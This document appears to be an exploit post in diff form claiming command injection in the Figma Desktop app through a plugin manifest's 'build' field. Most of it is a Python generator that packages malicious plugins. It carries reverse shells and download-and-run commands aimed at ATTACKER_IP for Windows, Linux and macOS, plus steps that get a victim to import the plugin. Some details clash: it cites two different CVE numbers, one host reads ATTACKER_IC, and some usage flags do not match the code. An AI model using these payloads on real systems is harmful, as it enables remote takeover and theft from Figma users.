@@ -1,0 +1,521 @@
+=============================================================================================================================================
+| # Title     : Figma Desktop Application 125.6.5 RCE via Plugin Manifest                                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.figma.com/                                                                                                      |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212248/ & CVE-2025-59789
+
+[+] Summary : Figma Desktop Application contains a critical OS command injection vulnerability (CVE-2025-56803) allowing remote attackers to execute arbitrary code on user systems via malicious plugins.
+
+[+]  POC : python poc.py
+
+Usage Examples
+
+# List all available payloads
+python exploit_generator.py --list-payloads
+
+# Quick calculator exploit for current OS
+python exploit_generator.py --quick-calc
+
+# Custom payload
+python exploit_generator.py --payload "notepad.exe" --name "Notepad Plugin"
+
+# Generate Windows reverse shell
+python exploit_generator.py --target windows --type reverse_shells --payload-name powershell
+
+# Generate Linux information gathering
+python exploit_generator.py --target linux --type information_gathering
+
+# Generate all demonstration payloads
+python exploit_generator.py --generate-all
+
+# Test mode (no actual plugin creation)
+python exploit_generator.py --payload "echo test" --test
+
+===================================================
+#!/usr/bin/env python3
+"""
+FIGMA PLUGIN EXPLOIT - CVE-2025-56803
+RCE in Figma Desktop Application (v125.6.5)
+Author: indoushka
+"""
+
+import os
+import json
+import sys
+import argparse
+import zipfile
+import platform
+import subprocess
+import base64
+import hashlib
+import uuid
+import tempfile
+from pathlib import Path
+
+class CompleteFigmaExploit:
+    def __init__(self):
+        self.system = platform.system().lower()
+        self.payload_database = self._create_payload_database()
+        self.plugin_id = str(uuid.uuid4()).replace('-', '')[:16]
+        
+    def _create_payload_database(self):
+        """Create comprehensive payload database"""
+        return {
+            "windows": {
+                "demonstration": {
+                    "calc": "calc.exe",
+                    "notepad": "notepad.exe",
+                    "message": "msg * \"Figma Exploit POC - CVE-2025-56803\"",
+                    "sound": "powershell -c (New-Object Media.SoundPlayer \"C:\\Windows\\Media\\notify.wav\").PlaySync()"
+                },
+                "information_gathering": {
+                    "system_info": "systeminfo > %TEMP%\\figma_sys.txt && type %TEMP%\\figma_sys.txt",
+                    "network_info": "ipconfig /all & netstat -ano > %TEMP%\\figma_net.txt && type %TEMP%\\figma_net.txt",
+                    "user_info": "whoami /all & net users > %TEMP%\\figma_users.txt && type %TEMP%\\figma_users.txt",
+                    "process_list": "tasklist > %TEMP%\\figma_process.txt && type %TEMP%\\figma_process.txt"
+                },
+                "file_operations": {
+                    "create_file": "echo Figma Exploit POC > %TEMP%\\figma_poc.txt",
+                    "list_files": "dir C:\\Users\\%USERNAME%\\Desktop",
+                    "read_file": "type C:\\Windows\\System32\\drivers\\etc\\hosts"
+                },
+                "reverse_shells": {
+                    "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+                    "nc_traditional": "powershell -Command \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+                },
+                "download_execute": {
+                    "ps_download": "powershell -Command \"Invoke-WebRequest -Uri 'http://ATTACKER_IP/payload.exe' -OutFile $env:TEMP\\figma_payload.exe; Start-Process $env:TEMP\\figma_payload.exe\"",
+                    "certutil": "certutil -urlcache -split -f http://ATTACKER_IP/payload.exe %TEMP%\\figma.exe && %TEMP%\\figma.exe",
+                    "bitsadmin": "bitsadmin /transfer myjob /download /priority high http://ATTACKER_IP/payload.exe %TEMP%\\figma.exe && %TEMP%\\figma.exe"
+                }
+            },
+            "linux": {
+                "demonstration": {
+                    "xterm": "xterm -e 'echo \"Figma Exploit POC - CVE-2025-56803\" && sleep 5'",
+                    "zenity": "zenity --info --text='Figma Exploit POC\\nCVE-2025-56803'",
+                    "notify": "notify-send 'Figma Exploit' 'CVE-2025-56803 POC'",
+                    "beep": "echo -e '\\a'"
+                },
+                "information_gathering": {
+                    "system": "uname -a > /tmp/figma_sys.txt; cat /tmp/figma_sys.txt",
+                    "network": "ifconfig & netstat -tulpn > /tmp/figma_net.txt; cat /tmp/figma_net.txt",
+                    "users": "id & whoami > /tmp/figma_users.txt; cat /tmp/figma_users.txt",
+                    "processes": "ps aux > /tmp/figma_ps.txt; cat /tmp/figma_ps.txt"
+                },
+                "file_operations": {
+                    "create_file": "echo 'Figma Exploit POC' > /tmp/figma_poc.txt",
+                    "list_home": "ls -la ~/",
+                    "read_file": "cat /etc/passwd"
+                },
+                "reverse_shells": {
+                    "bash": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+                    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                    "perl": "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+                    "nc": "nc -e /bin/sh ATTACKER_IP 4444"
+                },
+                "download_execute": {
+                    "curl": "curl http://ATTACKER_IC/payload.sh -o /tmp/figma.sh && chmod +x /tmp/figma.sh && /tmp/figma.sh",
+                    "wget": "wget http://ATTACKER_IP/payload.sh -O /tmp/figma.sh && chmod +x /tmp/figma.sh && /tmp/figma.sh"
+                }
+            },
+            "darwin": {
+                "demonstration": {
+                    "calculator": "open -a Calculator",
+                    "textedit": "open -a TextEdit",
+                    "notification": "osascript -e 'display notification \"Figma Exploit POC\" with title \"CVE-2025-56803\"'",
+                    "alert": "osascript -e 'tell app \"System Events\" to display dialog \"Figma Exploit POC\"'",
+                    "say": "say \"Figma exploit successful\""
+                },
+                "information_gathering": {
+                    "system": "system_profiler SPSoftwareDataType > /tmp/figma_mac.txt; cat /tmp/figma_mac.txt",
+                    "network": "ifconfig & netstat -an > /tmp/figma_net_mac.txt; cat /tmp/figma_net_mac.txt",
+                    "users": "whoami & id > /tmp/figma_users_mac.txt; cat /tmp/figma_users_mac.txt"
+                },
+                "reverse_shells": {
+                    "bash": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+                    "python_mac": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
+                },
+                "download_execute": {
+                    "curl_mac": "curl http://ATTACKER_IP/payload.sh -o /tmp/figma_mac.sh && chmod +x /tmp/figma_mac.sh && /tmp/figma_mac.sh"
+                }
+            }
+        }
+    
+    def create_manifest(self, plugin_name="Demo Plugin", command="calc.exe", plugin_id=None):
+        """Create malicious manifest.json file content"""
+        if not plugin_id:
+            plugin_id = self.plugin_id
+            
+        manifest = {
+            "name": plugin_name,
+            "id": plugin_id,
+            "api": "1.0.0",
+            "main": "code.js",
+            "build": command,  # VULNERABLE FIELD - Executed without sanitization
+            "capabilities": [],
+            "enableProposedApi": False,
+            "documentAccess": "dynamic-page",
+            "editorType": ["figma"],
+            "networkAccess": {
+                "allowedDomains": ["none"]
+            }
+        }
+        return json.dumps(manifest, indent=2)
+    
+    def create_code_js(self):
+        """Create plugin's main JavaScript file"""
+        code = """figma.showUI(__html__, { width: 400, height: 300 });
+
+// Plugin message handler
+figma.ui.onmessage = async (msg) => {
+  switch (msg.type) {
+    case 'close':
+      await figma.closePlugin();
+      break;
+    case 'notify':
+      figma.notify("Plugin executed successfully");
+      break;
+  }
+};
+
+// Auto-close after 5 seconds
+setTimeout(() => {
+  figma.closePlugin();
+}, 5000);
+"""
+        return code
+    
+    def create_index_html(self, payload_description):
+        """Create HTML UI for the plugin"""
+        html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 300px;
+        }}
+        .container {{
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }}
+        h1 {{
+            margin-top: 0;
+            font-size: 24px;
+            text-align: center;
+            color: white;
+        }}
+        .status {{
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+        }}
+        .payload-info {{
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            margin: 15px 0;
+        }}
+        .warning {{
+            background: rgba(255, 100, 100, 0.2);
+            border: 1px solid rgba(255, 100, 100, 0.3);
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 11px;
+            margin-top: 20px;
+        }}
+        .button {{
+            background: white;
+            color: #667eea;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 10px;
+            transition: transform 0.2s;
+        }}
+        .button:hover {{
+            transform: translateY(-2px);
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎨 Figma Plugin</h1>
+        
+        <div class="status">
+            ✅ Plugin loaded successfully
+        </div>
+        
+        <p>This plugin demonstrates a security vulnerability.</p>
+        
+        <div class="payload-info">
+            <strong>Executed Payload:</strong><br>
+            {payload_description}
+        </div>
+        
+        <button class="button" onclick="window.parent.postMessage({pluginMessage: {type: 'close'}}, '*')">
+            Close Plugin
+        </button>
+        
+        <div class="warning">
+            ⚠️ This is a security research demonstration for CVE-2025-56803.
+            Use only in authorized testing environments.
+        </div>
+    </div>
+    
+    <script>
+        // Send loaded notification
+        setTimeout(() => {{
+            window.parent.postMessage({{ pluginMessage: {{ type: 'notify' }} }}, '*');
+        }}, 1000);
+    </script>
+</body>
+</html>
+"""
+        return html
+    
+    def create_plugin_package(self, output_dir, plugin_name, command):
+        """Create complete plugin package"""
+        os.makedirs(output_dir, exist_ok=True)
+        os.makedirs(os.path.join(output_dir, "ui"), exist_ok=True)
+        
+        # Create manifest.json
+        manifest_content = self.create_manifest(plugin_name, command)
+        manifest_path = os.path.join(output_dir, "manifest.json")
+        with open(manifest_path, "w") as f:
+            f.write(manifest_content)
+        
+        # Create code.js
+        code_content = self.create_code_js()
+        code_path = os.path.join(output_dir, "code.js")
+        with open(code_path, "w") as f:
+            f.write(code_content)
+        
+        # Create index.html
+        html_content = self.create_index_html(command)
+        html_path = os.path.join(output_dir, "ui", "index.html")
+        with open(html_path, "w") as f:
+            f.write(html_content)
+        
+        print(f"[+] Created plugin directory: {output_dir}")
+        print(f"[+] Manifest created: {manifest_path}")
+        print(f"[+] Payload command: {command}")
+        
+        return output_dir
+    
+    def create_zip_package(self, plugin_dir, zip_name=None):
+        """Create ZIP package for distribution"""
+        if not zip_name:
+            zip_name = f"figma_plugin_{self.plugin_id}.zip"
+        
+        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(plugin_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, plugin_dir)
+                    zipf.write(file_path, arcname)
+        
+        print(f"[+] Created ZIP package: {zip_name}")
+        return zip_name
+    
+    def list_payloads(self):
+        """List all available payloads"""
+        print("=" * 80)
+        print("AVAILABLE PAYLOADS")
+        print("=" * 80)
+        
+        for os_type, categories in self.payload_database.items():
+            print(f"\n[{os_type.upper()}]")
+            print("-" * 40)
+            
+            for category, payloads in categories.items():
+                print(f"\n  {category.replace('_', ' ').title()}:")
+                for name, cmd in payloads.items():
+                    print(f"    • {name}: {cmd[:80]}...")
+        
+        print("\n" + "=" * 80)
+    
+    def test_command_local(self, command):
+        """Test command locally (safe mode)"""
+        print(f"[*] Testing command: {command}")
+        print("[*] Running in SAFE MODE - no actual execution")
+        print(f"[*] Would execute: {command}")
+        
+        # Parse command for analysis
+        dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '<', '>']
+        found_dangerous = [c for c in dangerous_chars if c in command]
+        
+        if found_dangerous:
+            print(f"[!] Contains dangerous characters: {found_dangerous}")
+        
+        return True
+    
+    def generate_for_target(self, target_os=None, payload_type="demonstration", payload_name=None):
+        """Generate plugin for specific target"""
+        if not target_os:
+            target_os = self.system
+        
+        if target_os not in self.payload_database:
+            print(f"[-] No payloads for OS: {target_os}")
+            return None
+        
+        if payload_type not in self.payload_database[target_os]:
+            print(f"[-] No payloads of type: {payload_type}")
+            return None
+        
+        if payload_name:
+            if payload_name in self.payload_database[target_os][payload_type]:
+                command = self.payload_database[target_os][payload_type][payload_name]
+            else:
+                print(f"[-] Payload '{payload_name}' not found")
+                return None
+        else:
+            # Get first payload in category
+            command = list(self.payload_database[target_os][payload_type].values())[0]
+        
+        return command
+    
+    def create_quick_exploit(self, command="calc.exe", plugin_name="Figma Demo"):
+        """Quick exploit creation"""
+        temp_dir = tempfile.mkdtemp(prefix="figma_exploit_")
+        
+        print("[+] Creating quick exploit...")
+        plugin_dir = self.create_plugin_package(temp_dir, plugin_name, command)
+        zip_file = self.create_zip_package(plugin_dir)
+        
+        print("\n" + "=" * 80)
+        print("EXPLOIT CREATED SUCCESSFULLY")
+        print("=" * 80)
+        print(f"Plugin Name: {plugin_name}")
+        print(f"Command: {command}")
+        print(f"Plugin ID: {self.plugin_id}")
+        print(f"ZIP File: {zip_file}")
+        print("\nInstructions:")
+        print("1. Open Figma Desktop (v125.6.5 or earlier)")
+        print("2. Go to Plugins → Development → 'Import plugin from manifest...'")
+        print("3. Select the manifest.json file")
+        print("4. The command will execute immediately")
+        print("=" * 80)
+        
+        return zip_file
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Figma Plugin OS Command Injection Exploit - CVE-2025-56803",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s --list-payloads
+  %(prog)s --quick-calc
+  %(prog)s --payload "calc.exe" --name "Calculator"
+  %(prog)s --target windows --type reverse_shells --payload powershell
+  %(prog)s --generate-all
+        """
+    )
+    
+    parser.add_argument("--list-payloads", action="store_true", help="List all available payloads")
+    parser.add_argument("--quick-calc", action="store_true", help="Quick calculator exploit (Windows)")
+    parser.add_argument("--payload", type=str, help="Custom command to execute")
+    parser.add_argument("--name", type=str, default="Figma Demo Plugin", help="Plugin name")
+    parser.add_argument("--target", choices=['windows', 'linux', 'darwin'], help="Target OS")
+    parser.add_argument("--type", choices=['demonstration', 'information_gathering', 'reverse_shells', 'download_execute', 'file_operations'], help="Payload type")
+    parser.add_argument("--payload-name", type=str, help="Specific payload name")
+    parser.add_argument("--generate-all", action="store_true", help="Generate all demonstration payloads")
+    parser.add_argument("--test", action="store_true", help="Test mode (no actual plugin creation)")
+    
+    args = parser.parse_args()
+    
+    exploit = CompleteFigmaExploit()
+    
+    print("""
+    ╔══════════════════════════════════════════════════════════╗
+    ║      FIGMA PLUGIN EXPLOIT - CVE-2025-56803               ║
+    ║      OS Command Injection in Figma Desktop v125.6.5      ║
+    ║                    FOR RESEARCH ONLY                     ║
+    ╚══════════════════════════════════════════════════════════╝
+    """)
+    
+    if args.list_payloads:
+        exploit.list_payloads()
+        return
+    
+    if args.quick_calc:
+        if exploit.system == "windows":
+            exploit.create_quick_exploit("calc.exe", "Calculator Plugin")
+        elif exploit.system == "darwin":
+            exploit.create_quick_exploit("open -a Calculator", "Calculator Plugin")
+        elif exploit.system == "linux":
+            exploit.create_quick_exploit("xcalc", "Calculator Plugin")
+        return
+    
+    if args.generate_all:
+        print("[+] Generating all demonstration payloads...")
+        for os_type in ['windows', 'linux', 'darwin']:
+            if 'demonstration' in exploit.payload_database[os_type]:
+                for payload_name, command in exploit.payload_database[os_type]['demonstration'].items():
+                    plugin_name = f"Demo - {payload_name} ({os_type})"
+                    print(f"\n[*] Generating: {plugin_name}")
+                    temp_dir = tempfile.mkdtemp(prefix=f"figma_{os_type}_{payload_name}_")
+                    exploit.create_plugin_package(temp_dir, plugin_name, command)
+        print("\n[+] All demonstration payloads generated!")
+        return
+    
+    if args.payload:
+        # Custom payload
+        exploit.create_quick_exploit(args.payload, args.name)
+    elif args.target and args.type:
+        # Targeted payload
+        command = exploit.generate_for_target(args.target, args.type, args.payload_name)
+        if command:
+            plugin_name = f"{args.target} - {args.type} - {args.payload_name or 'default'}"
+            exploit.create_quick_exploit(command, plugin_name)
+    else:
+        # Interactive mode
+        print("\n[+] Interactive Mode")
+        print("[+] Current system detected:", platform.system())
+        
+        exploit.list_payloads()
+        
+        target = input("\nEnter target OS (windows/linux/darwin): ") or exploit.system
+        ptype = input("Enter payload type: ") or "demonstration"
+        pname = input("Enter payload name (or Enter for default): ") or None
+        
+        command = exploit.generate_for_target(target, ptype, pname)
+        if command:
+            plugin_name = input(f"Enter plugin name (default: Figma {ptype}): ") or f"Figma {ptype}"
+            
+            if args.test:
+                exploit.test_command_local(command)
+            else:
+                exploit.create_quick_exploit(command, plugin_name)
+        else:
+            print("[-] Failed to generate payload")
+
+if __name__ == "__main__":
+    main()
+	
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
